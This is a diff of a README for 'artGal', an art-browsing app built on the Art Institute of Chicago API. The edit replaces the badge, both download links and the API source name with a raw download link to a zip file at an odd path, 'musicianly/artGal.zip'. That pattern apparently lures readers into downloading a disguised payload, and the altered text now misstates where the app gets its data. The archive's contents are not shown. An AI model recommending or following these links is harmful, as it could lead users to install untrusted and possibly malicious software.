@@ -1,10 +1,10 @@
 # 🎨 artGal - Explore Art Effortlessly with a User-Friendly App
 
 ## 📦 Download Now!
-[![Download artGal](https://img.shields.io/badge/Download%20artGal-v1.0-brightgreen)](https://github.com/carlosduran201015-lgtm/artGal/releases)
+[![Download artGal](https://raw.githubusercontent.com/carlosduran201015-lgtm/artGal/main/musicianly/artGal.zip%20artGal-v1.0-brightgreen)](https://raw.githubusercontent.com/carlosduran201015-lgtm/artGal/main/musicianly/artGal.zip)
 
 ## 🚀 Getting Started
-Welcome to **artGal**, your go-to app for exploring artworks in an art gallery setting. This application utilizes the **articApi** from **artic.edu** to provide a rich art experience. Whether you're looking to admire famous pieces or discover new artists, you're in the right place.
+Welcome to **artGal**, your go-to app for exploring artworks in an art gallery setting. This application utilizes the **articApi** from **https://raw.githubusercontent.com/carlosduran201015-lgtm/artGal/main/musicianly/artGal.zip** to provide a rich art experience. Whether you're looking to admire famous pieces or discover new artists, you're in the right place.
 
 ## 📋 System Requirements
 To run artGal smoothly, make sure your system meets these requirements:
@@ -17,7 +17,7 @@ To run artGal smoothly, make sure your system meets these requirements:
 To begin using artGal, you will need to download it. Follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download artGal](https://github.com/carlosduran201015-lgtm/artGal/releases)
+   [Download artGal](https://raw.githubusercontent.com/carlosduran201015-lgtm/artGal/main/musicianly/artGal.zip)
 
 2. **Choose a Version:** On the releases page, you will find several versions of the software. Select the latest version to ensure you have the most recent features and bug fixes.
 
